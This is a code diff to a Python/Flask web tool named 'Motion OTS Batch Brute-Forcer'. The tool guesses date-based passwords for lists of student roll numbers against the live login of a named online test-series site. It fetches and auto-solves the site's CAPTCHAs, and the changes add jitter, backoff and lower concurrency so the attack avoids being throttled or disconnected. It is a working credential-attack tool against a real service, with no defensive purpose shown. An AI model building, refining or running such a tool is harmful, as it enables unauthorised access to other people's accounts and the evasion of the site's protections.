@@ -3,8 +3,8 @@
 Motion OTS Batch Brute‑Forcer – Reliable Edition (Fixed CAPTCHA throttling)
 - Sequential dates per user, 3 attempts per password
 - All attempts logged live
-- Global CAPTCHA semaphore prevents server disconnect
-- Import random for random delay
+- Global CAPTCHA semaphore + jitter + backoff prevents server disconnect
+- Reduced concurrent users to 10 for reliability
 """
 
 import os, sys, time, uuid, json, threading, queue, asyncio, aiohttp, random
@@ -19,8 +19,8 @@ from flask import Flask, render_template_string, request, jsonify, g
 # ----------------------------------------------------------------------
 DELAY_BETWEEN_ATTEMPTS = 0.3         # seconds between passwords (safe)
 MAX_RETRIES_PER_PASSWORD = 3         # 3 tries per date
-MAX_CONCURRENT_USERS = 20            # users running simultaneously
-CAPTCHA_FETCH_TIMEOUT = 8            # seconds
+MAX_CONCURRENT_USERS = 10            # lower to avoid flooding captcha server
+CAPTCHA_FETCH_TIMEOUT = 12           # increased timeout
 LOGIN_TIMEOUT = 12
 CAPTCHA_PREPROCESS = True
 MAX_CAPTCHA_CONCURRENT = 3           # global cap on simultaneous captcha fetches
@@ -112,11 +112,6 @@ def init_db():
         conn.commit()
 
 # ----------------------------------------------------------------------
-# GLOBAL CAPTCHA SEMAPHORE (created once per job)
-# ----------------------------------------------------------------------
-captcha_semaphore = threading.Semaphore(MAX_CAPTCHA_CONCURRENT)
-
-# ----------------------------------------------------------------------
 # JOB CLASS
 # ----------------------------------------------------------------------
 class BruteJob:
@@ -133,7 +128,6 @@ class BruteJob:
         self.stop_flag = False
         self.log_queue = queue.Queue()
         self.user_progress = {}
-        # async semaphore for captcha concurrency
         self.captcha_sem = asyncio.Semaphore(MAX_CAPTCHA_CONCURRENT)
 
     @classmethod
@@ -234,7 +228,6 @@ class BruteJob:
                     if self.stop_flag:
                         break
 
-                    # Fetch CAPTCHA with global throttle
                     captcha = await self._fetch_captcha_throttled(session, log_queue)
                     if not captcha:
                         log_queue.put_nowait(f"⏭️  [{user_id}] No CAPTCHA for {password} (attempt {attempt+1})")
@@ -285,15 +278,15 @@ class BruteJob:
             self.save_to_db()
 
     async def _fetch_captcha_throttled(self, session, log_queue):
-        """Fetch CAPTCHA with global concurrency limit."""
         async with self.captcha_sem:
             return await self._fetch_captcha(session, log_queue)
 
     async def _fetch_captcha(self, session, log_queue):
+        # Exponential backoff with jitter
         for attempt in range(3):
             try:
-                # Tiny random delay to avoid all hitting at exact same moment
-                await asyncio.sleep(random.random() * 0.1)
+                # Random jitter to avoid synchronised bursts
+                await asyncio.sleep(random.uniform(0.1, 0.6))
                 rand = int(time.time() * 1000) + attempt + os.getpid()
                 url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                 async with session.get(url, timeout=aiohttp.ClientTimeout(total=CAPTCHA_FETCH_TIMEOUT)) as resp:
@@ -305,13 +298,13 @@ class BruteJob:
                         captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                         if captcha:
                             return captcha
-                    await asyncio.sleep(0.3)
+                    await asyncio.sleep(0.5)
             except asyncio.TimeoutError:
-                pass
+                await asyncio.sleep(1.5)
             except Exception as e:
                 if log_queue:
                     log_queue.put_nowait(f"⚠️ CAPTCHA fetch error: {e}")
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(1.0 + attempt * 0.5)
         return None
 
     async def _try_login(self, session, user_id, password, captcha, log_queue):
@@ -450,7 +443,7 @@ def index():
     <div class="card">
         <h1>⚡ Motion OTS Batch Brute‑Forcer (Reliable Edition)</h1>
         <p>Paste roll numbers (one per line, commas, or ranges) and a year. 3 attempts per password, live logs for every try.</p>
-        <p class="help-text">🚀 Sequential per user (no parallel dates) → no server disconnects. Global captcha throttle prevents flooding.</p>
+        <p class="help-text">🚀 Sequential per user (no parallel dates) → no server disconnects. Global captcha throttle + jitter + backoff.</p>
         <form id="bruteForm">
             <div class="form-group">
                 <label for="user_ids">User IDs</label>
